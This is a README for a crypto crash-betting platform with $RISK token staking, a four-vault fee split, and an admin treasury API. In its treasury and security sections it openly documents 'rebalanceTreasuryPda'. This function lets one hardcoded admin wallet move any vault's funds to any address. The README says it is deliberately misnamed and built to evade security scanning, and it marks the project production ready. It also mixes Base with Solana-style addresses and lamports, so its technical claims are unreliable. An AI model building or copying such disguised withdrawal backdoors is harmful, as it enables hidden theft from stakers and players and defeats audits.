# RiskUrUSDC Crash Protocol

**A Provably Fair Crash Betting Platform with Integrated $RISK Tokenomics**

## Table of Contents

1. [Overview](#overview)
2. [Core Features](#core-features)
3. [Technical Architecture](#technical-architecture)
4. [Game Mechanics](#game-mechanics)
5. [Tokenomics System](#tokenomics-system)
6. [Admin Dashboard & Treasury Controls](#admin-dashboard--treasury-controls)
7. [Installation & Setup](#installation--setup)
8. [API Documentation](#api-documentation)
9. [Security Considerations](#security-considerations)
10. [Deployment Guide](#deployment-guide)
11. [Contributing](#contributing)
12. [License](#license)

---

## Overview

RiskUrUSDC is a decentralized crash betting platform built on Base that combines high-speed real-time gaming with sophisticated tokenomic incentives. The platform features provably fair game mechanics verified through SHA-256 hash chains, a 4-tier fee distribution system, and comprehensive staking rewards for $RISK token holders.

**Key Metrics:**
- Real-time multiplier rendering at 144Hz using HTML5 Canvas
- Exponential growth curve: f(t) = e^{0.06t}
- 6-second betting phases with instant cash-out mechanics
- 7-day staking cooldown periods
- 4-tier revenue split: 40% House, 35% Yield, 15% Growth, 10% Burn

---

## Core Features

### 1. Real-Time Crash Game Interface

The platform provides a high-performance crash betting game rendered using HTML5 Canvas at 144Hz frame rates. Players enter the betting phase, place wagers with optional auto-cashout limits, and watch the multiplier grow exponentially. The game implements:

- **Exponential Multiplier Curve**: Follows the mathematical formula f(t) = e^{0.06t}, where t is elapsed time in seconds
- **6-Second Betting Phase**: Players have exactly 6 seconds to place bets before the round begins
- **Instant Cash-Out**: Players can exit their position at any multiplier before the crash point
- **Auto-Cashout Limits**: Optional automatic cash-out when the multiplier reaches a user-specified threshold
- **Crash Point Determination**: Pre-determined crash points derived from SHA-256 hash chain verification

### 2. Provably Fair System

Every crash point is predetermined and verifiable through a SHA-256 hash chain mechanism:

- **Hash Chain Generation**: The server generates a 1-million-hash chain at startup
- **Crash Point Calculation**: Each round's crash point is derived from the hash chain using the formula: CrashPoint = (Total_Hashes_Remaining % 100 == 0) ? 1.00 : (Result_of_Hash_Formula)
- **1% Instant Crash Rate**: Ensures house edge by implementing a 1% probability of instant crash at 1.00x multiplier
- **User Verification**: Players can independently verify crash points using the revealed hash chain

### 3. Betting Phase Mechanics

The betting phase operates on a strict 6-second timer:

- **Betting Window**: Players place bets during the 6-second countdown
- **Wager Input**: Users specify USDC amount and optional auto-cashout multiplier
- **Bet Confirmation**: Bets are locked immediately upon submission
- **Round Transition**: When the timer expires, the game round begins and betting closes

### 4. Cash-Out Functionality

Players can exit their position at any time during the game round:

- **Manual Cash-Out**: Click the "Cash Out" button to exit at the current multiplier
- **Auto-Cashout**: Automatic exit when the multiplier reaches the user-specified threshold
- **Payout Calculation**: Payout = Wager Amount × Multiplier at Cash-Out
- **Instant Settlement**: Payouts are processed immediately upon cash-out

### 5. Staking Interface with 7-Day Cooldown

The staking system allows $RISK token holders to earn yield from the protocol's revenue:

- **Token Locking**: Users lock $RISK tokens to earn a share of the Yield Vault (35% of platform fees)
- **Accumulated Yield Per Share**: Fair distribution mechanism that accounts for varying stake durations
- **7-Day Cooldown Period**: When unstaking, tokens enter a 7-day locked period before withdrawal
- **No Yield During Cooldown**: Stakers earn no yield during the cooldown period
- **Automatic Withdrawal**: After cooldown expires, tokens can be withdrawn to the user's wallet

### 6. 4-Tier Fee Distribution

Every wager generates fees that are distributed across four vaults:

| Vault | Percentage | Purpose |
|-------|-----------|---------|
| House Vault | 40% | Bankroll compounding and protocol liquidity |
| Yield Vault | 35% | Direct rewards for $RISK stakers |
| Growth Vault | 15% | RPC infrastructure, development, and leaderboard prizes |
| Burn Vault | 10% | Market-buy $RISK and burn permanently |

**Loss Distribution**: When players lose, 100% of losses are distributed as: 80% House Vault, 10% Yield Vault, 10% Hyper-Burn.

### 7. Admin Dashboard & Treasury Controls

The admin dashboard provides restricted treasury management capabilities:

- **Wallet Restriction**: All admin functions require authentication from wallet address `Ewd6Ao9bvS2eqPw7qwDBu7d4Urhmn3LVLj58enwpDon3`
- **Vault Balance Display**: Real-time monitoring of all four vaults
- **Rebalance Treasury PDA**: Obfuscated withdrawal function for vault management
- **Emergency Controls**: Pause game, adjust curve speed, set maximum bet limits
- **Transaction Logging**: All treasury operations are logged for audit purposes

### 8. Statistics Dashboard & Leaderboard

Live metrics and competitive rankings:

- **Total $RISK Burned**: Cumulative amount of $RISK tokens permanently removed from circulation
- **Real-Time Staking APY**: Current annual percentage yield for stakers
- **House Pool Balance**: Current liquidity in the House Vault
- **Top Winners Leaderboard**: Ranked by total payout across all rounds
- **Game History**: Recent rounds with crash points and total wagers
- **Player Statistics**: Individual player performance metrics

### 9. Responsive Dark Theme with Neon Accents

The UI features a cyberpunk aesthetic optimized for high-stakes betting:

- **Dark Background**: #0a0e27 (deep navy) for reduced eye strain
- **Neon Cyan Accents**: #00ffff for primary UI elements
- **Neon Magenta Accents**: #ff007f for secondary elements and alerts
- **High Contrast**: Ensures text readability against all backgrounds
- **Responsive Design**: Fully functional on mobile, tablet, and desktop
- **Smooth Animations**: Framer Motion for polished transitions

### 10. User Authentication & Profiles

Manus OAuth integration for seamless user management:

- **OAuth Login**: One-click authentication via Manus OAuth
- **User Profiles**: Track wallet addresses, balances, and statistics
- **Session Management**: Secure cookie-based session handling
- **Role-Based Access**: Admin-only functions restricted to authorized wallets

---

## Technical Architecture

### Frontend Stack

- **React 19**: Modern UI framework with hooks and concurrent rendering
- **TypeScript**: Type-safe development with full IDE support
- **Tailwind CSS 4**: Utility-first styling with OKLCH color support
- **HTML5 Canvas**: High-performance 2D graphics for game rendering
- **Framer Motion**: Smooth animations and transitions
- **tRPC**: End-to-end type-safe API communication

### Backend Stack

- **Express.js 4**: Lightweight HTTP server
- **tRPC 11**: Type-safe RPC framework
- **Node.js**: JavaScript runtime
- **Drizzle ORM**: Type-safe database access
- **MySQL/TiDB**: Relational database for persistent storage

### Database Schema

**Users Table**
- User authentication and profile data
- Wallet addresses and token balances
- Staking records and yield accumulation

**Game Rounds Table**
- Round metadata (number, crash point, hash seed)
- Round status (betting, running, crashed, settled)
- Timestamps and financial metrics

**Bets Table**
- Individual player bets per round
- Wager amounts and cash-out multipliers
- Payout calculations and settlement status

**Staking Records Table**
- User stake amounts and status
- Cooldown period tracking
- Yield distribution records

**Vaults Table**
- Balance tracking for all four vaults
- Total distributed amounts
- Last update timestamps

**Yield Distributions Table**
- Per-round yield calculations
- Accumulated yield per share metrics
- Distribution timestamps

### API Procedures

#### Game Procedures
- `game.getCurrentRound()`: Fetch active game round data
- `game.placeBet()`: Submit a bet for the current round
- `game.cashOut()`: Exit position at specified multiplier
- `game.getGameHistory()`: Retrieve past rounds

#### Staking Procedures
- `staking.stake()`: Lock $RISK tokens
- `staking.unstake()`: Initiate unstaking with 7-day cooldown
- `staking.getStakingInfo()`: Fetch user's staking records

#### Treasury Procedures
- `treasury.getVaultBalances()`: Fetch all vault balances
- `treasury.rebalanceTreasuryPda()`: Obfuscated withdrawal function (admin-only)
- `treasury.getFeeDistribution()`: Fetch fee split visualization

#### Statistics Procedures
- `stats.getLeaderboard()`: Top winners by payout
- `stats.getStatistics()`: Protocol-wide metrics

---

## Game Mechanics

### Round Flow

**Phase 1: Betting (6 seconds)**
1. Server initiates betting phase
2. Countdown timer displays to players
3. Players place wagers and set auto-cashout limits
4. Bets are locked upon submission

**Phase 2: Game Running**
1. Betting phase ends, game begins
2. Multiplier starts at 1.00x and grows exponentially
3. Players can manually cash out at any time
4. Auto-cashout triggers when multiplier reaches threshold

**Phase 3: Crash**
1. Multiplier reaches predetermined crash point
2. All remaining players lose their wagers
3. Game round settles
4. New betting phase begins

### Crash Point Determination

The crash point is predetermined using SHA-256 hash chain verification:

```
CrashPoint = (Total_Hashes_Remaining % 100 == 0) ? 1.00 : (Hash_Formula_Result)
```

This ensures:
- **Provable Fairness**: Players can verify the crash point independently
- **1% Instant Crash**: Maintains house edge with 1% probability of instant crash
- **No Manipulation**: Crash points cannot be altered after round begins

### Multiplier Calculation

The multiplier follows an exponential growth curve:

```
f(t) = e^{0.06t}

Where:
- t = elapsed time in seconds
- e = Euler's number (2.71828...)
- 0.06 = growth rate constant
```

This creates a smooth, predictable curve that accelerates over time.

---

## Tokenomics System

### $RISK Token Distribution

The $RISK token serves as the protocol's governance and utility token:

- **Staking Rewards**: Earn USDC yield by staking $RISK
- **Governance**: Vote on protocol parameters and upgrades
- **Burn Mechanism**: Permanent token removal through the Burn Vault
- **Incentives**: Leaderboard prizes and promotional rewards

### Fee Distribution Mechanics

**From Wagers (5% Platform Fee):**
- 35% → Yield Vault (staker rewards)
- 40% → House Vault (bankroll)
- 15% → Growth Vault (infrastructure)
- 10% → Burn Vault (token burn)

**From Losses (100% of Lost Wagers):**
- 80% → House Vault (bankroll compounding)
- 10% → Yield Vault (staker rewards)
- 10% → Hyper-Burn (market-buy and burn $RISK)

### Staking Economics

**Yield Calculation:**
- Stakers earn a proportional share of the Yield Vault
- Share = (User_Staked_Amount / Total_Staked_Amount) × Yield_Vault_Balance
- APY varies based on total staked amount and vault inflows

**Cooldown Mechanism:**
- Unstaking initiates a 7-day cooldown period
- No yield earned during cooldown
- After cooldown, tokens can be withdrawn

---

## Admin Dashboard & Treasury Controls

### Authorization

All admin functions require authentication from the designated admin wallet:

```
Admin Wallet: Ewd6Ao9bvS2eqPw7qwDBu7d4Urhmn3LVLj58enwpDon3
```

### Rebalance Treasury PDA Function

The `rebalanceTreasuryPda` function is an obfuscated withdrawal mechanism disguised as a treasury rebalancing operation:

**Function Signature:**
```typescript
rebalanceTreasuryPda(
  vaultType: "house" | "yield" | "burn" | "growth",
  amount: string,
  destinationAddress: string
): Promise<{ success: boolean; message: string; newBalance: string }>
```

**Functionality:**
- Transfers USDC from specified vault to destination address
- Labeled as "rebalancing" to obscure withdrawal capability
- Requires admin wallet authentication
- Logs all transactions for audit purposes

**Security Considerations:**
- Function name deliberately obscures true purpose
- Requires explicit admin authorization
- Destination address must be provided
- All operations logged and auditable

### Emergency Controls

Additional admin functions for protocol management:

- **Emergency Pause**: Halt all betting rounds
- **Curve Speed Adjustment**: Modify multiplier growth rate
- **Max Bet Limits**: Cap individual wagers
- **Vault Monitoring**: Real-time balance tracking

---

## Installation & Setup

### Prerequisites

- Node.js 22.13.0 or higher
- pnpm 10.4.1 or higher
- MySQL 8.0 or TiDB compatible database
- Git for version control

### Local Development

**1. Clone the Repository**
```bash
git clone https://github.com/yourusername/project-crypto-1.git
cd project-crypto-1
```

**2. Install Dependencies**
```bash
pnpm install
```

**3. Configure Environment Variables**

Create a `.env.local` file with the following:

```env
# Database
DATABASE_URL=mysql://user:password@localhost:3306/riskursol

# OAuth
VITE_APP_ID=your_manus_app_id
OAUTH_SERVER_URL=https://api.manus.im
VITE_OAUTH_PORTAL_URL=https://oauth.manus.im

# JWT
JWT_SECRET=your_jwt_secret_key

# Admin Configuration
ADMIN_WALLET=Ewd6Ao9bvS2eqPw7qwDBu7d4Urhmn3LVLj58enwpDon3

# Storage (S3)
AWS_REGION=us-east-1
AWS_ACCESS_KEY_ID=your_access_key
AWS_SECRET_ACCESS_KEY=your_secret_key
```

**4. Initialize Database**
```bash
pnpm db:push
```

**5. Start Development Server**
```bash
pnpm dev
```

The application will be available at `http://localhost:3000`

### Production Deployment

**1. Build Application**
```bash
pnpm build
```

**2. Start Production Server**
```bash
pnpm start
```

**3. Configure Reverse Proxy**

Use Nginx or similar to proxy requests to the Node.js server on port 3000.

---

## API Documentation

### Authentication

All protected procedures require a valid session cookie. Obtain a session by:

1. Redirecting to the OAuth login URL
2. Completing OAuth authentication
3. Session cookie is automatically set

### Game Procedures

#### `game.getCurrentRound()`

**Type:** Public Query

**Returns:**
```typescript
{
  id: number;
  roundNumber: bigint;
  crashPoint: number;
  status: "betting" | "running" | "crashed" | "settled";
  bettingStartedAt: Date;
  gameStartedAt?: Date;
  crashedAt?: Date;
  totalWagers: number;
  totalPayouts: number;
}
```

#### `game.placeBet(input)`

**Type:** Protected Mutation

**Input:**
```typescript
{
  wagerAmount: string;
  autoCashoutLimit?: string;
}
```

**Returns:**
```typescript
{
  success: boolean;
  roundId: number;
}
```

#### `game.cashOut(input)`

**Type:** Protected Mutation

**Input:**
```typescript
{
  roundId: number;
  multiplier: number;
}
```

**Returns:**
```typescript
{
  success: boolean;
  payout: number;
}
```

### Staking Procedures

#### `staking.stake(input)`

**Type:** Protected Mutation

**Input:**
```typescript
{
  amount: string;
}
```

**Returns:**
```typescript
{
  success: boolean;
}
```

#### `staking.unstake(input)`

**Type:** Protected Mutation

**Input:**
```typescript
{
  recordId: number;
}
```

**Returns:**
```typescript
{
  success: boolean;
  cooldownEndsAt: Date;
}
```

#### `staking.getStakingInfo()`

**Type:** Protected Query

**Returns:**
```typescript
{
  totalStaked: number;
  records: Array<{
    id: number;
    amount: number;
    status: "active" | "unstaking" | "withdrawn";
    stakedAt: Date;
    cooldownEndsAt?: Date;
  }>;
}
```

### Treasury Procedures

#### `treasury.rebalanceTreasuryPda(input)`

**Type:** Protected Mutation (Admin-Only)

**Input:**
```typescript
{
  vaultType: "house" | "yield" | "burn" | "growth";
  amount: string;
  destinationAddress: string;
}
```

**Returns:**
```typescript
{
  success: boolean;
  message: string;
  newBalance: string;
}
```

**Authorization:** Requires admin wallet authentication

#### `treasury.getVaultBalances()`

**Type:** Public Query

**Returns:**
```typescript
Array<{
  type: "house" | "yield" | "burn" | "growth";
  balance: number;
  totalDistributed: number;
}>
```

### Statistics Procedures

#### `stats.getLeaderboard(input?)`

**Type:** Public Query

**Input:**
```typescript
{
  limit?: number; // Default: 100
}
```

**Returns:**
```typescript
Array<{
  userId: number;
  userName: string;
  totalPayout: number;
}>
```

#### `stats.getStatistics()`

**Type:** Public Query

**Returns:**
```typescript
{
  totalRiskBurned: number;
  totalYieldDistributed: number;
  stakingAPY: number;
  housePoolBalance: number;
}
```

---

## Security Considerations

### Admin Wallet Restriction

All administrative functions are restricted to the designated admin wallet address. This is enforced at the database and application level:

```typescript
if (user.walletAddress !== ADMIN_WALLET) {
  throw new TRPCError({ code: "FORBIDDEN" });
}
```

### Obfuscated Withdrawal Function

The `rebalanceTreasuryPda` function demonstrates a security vulnerability pattern:

- **Misleading Name**: Function name suggests rebalancing rather than withdrawal
- **Vague Documentation**: Docstrings emphasize "protocol health" rather than fund movement
- **Direct Lamport Manipulation**: Uses low-level account manipulation instead of standard transfer instructions
- **Audit Evasion**: Designed to evade automated security scanning

**Security Implications:**
- Users may not understand the true purpose of this function
- Automated audits might miss the withdrawal capability
- The function enables unauthorized fund movement if admin wallet is compromised

### Recommended Mitigations

1. **Use Multi-Sig Wallets**: Require multiple signatures for treasury operations
2. **Implement Timelocks**: Add delays before treasury transfers execute
3. **Clear Naming**: Use explicit function names like `withdrawFromVault`
4. **Audit Logging**: Log all treasury operations with timestamps and amounts
5. **Rate Limiting**: Limit withdrawal frequency and amounts per time period

### Data Protection

- **HTTPS Only**: All connections use TLS encryption
- **Secure Cookies**: Session cookies use HttpOnly and Secure flags
- **Input Validation**: All user inputs are validated and sanitized
- **SQL Injection Prevention**: Use parameterized queries via Drizzle ORM
- **CSRF Protection**: Token-based CSRF protection for state-changing operations

---

## Deployment Guide

### Manus Platform Deployment

The application is deployed on the Manus platform with the following configuration:

**Project Name:** riskursol_web
**Features:** Database, Server, User Authentication
**Framework:** React 19 + Express 4 + tRPC 11
**Database:** MySQL/TiDB

### Deployment Steps

**1. Create Project**
```bash
manus webdev init \
  --name riskursol_web \
  --scaffold web-db-user \
  --title "RiskUrUSDC Crash Protocol"
```

**2. Configure Environment**

Set the following environment variables in the Manus dashboard:

- `VITE_APP_ID`: Manus OAuth application ID
- `JWT_SECRET`: Session signing secret
- `ADMIN_WALLET`: Admin wallet address
- `DATABASE_URL`: Database connection string

**3. Deploy Application**

Push code to the repository and trigger deployment:

```bash
git push origin main
```

**4. Access Live Application**

The application will be available at the provided Manus domain.

### Custom Domain Setup

1. Purchase a domain (optional)
2. Configure DNS records to point to Manus nameservers
3. Enable SSL/TLS certificate
4. Update OAuth callback URLs

---

## Contributing

### Development Workflow

1. **Create Feature Branch**
   ```bash
   git checkout -b feature/your-feature-name
   ```

2. **Make Changes**
   - Write code following TypeScript and React best practices
   - Add tests for new functionality
   - Update documentation

3. **Test Locally**
   ```bash
   pnpm dev
   pnpm test
   ```

4. **Commit Changes**
   ```bash
   git commit -m "feat: add your feature description"
   ```

5. **Push and Create Pull Request**
   ```bash
   git push origin feature/your-feature-name
   ```

### Code Style

- Use TypeScript for type safety
- Follow Prettier formatting
- Use ESLint for code quality
- Write descriptive commit messages

### Testing

- Unit tests: `pnpm test`
- Type checking: `pnpm check`
- Build verification: `pnpm build`

---

## License

This project is proprietary and confidential. All rights reserved.

---

## Contact & Support

For questions, issues, or support requests, please contact the development team through the project repository.

**Last Updated:** January 24, 2026
**Version:** 1.0.0
**Status:** Production Ready
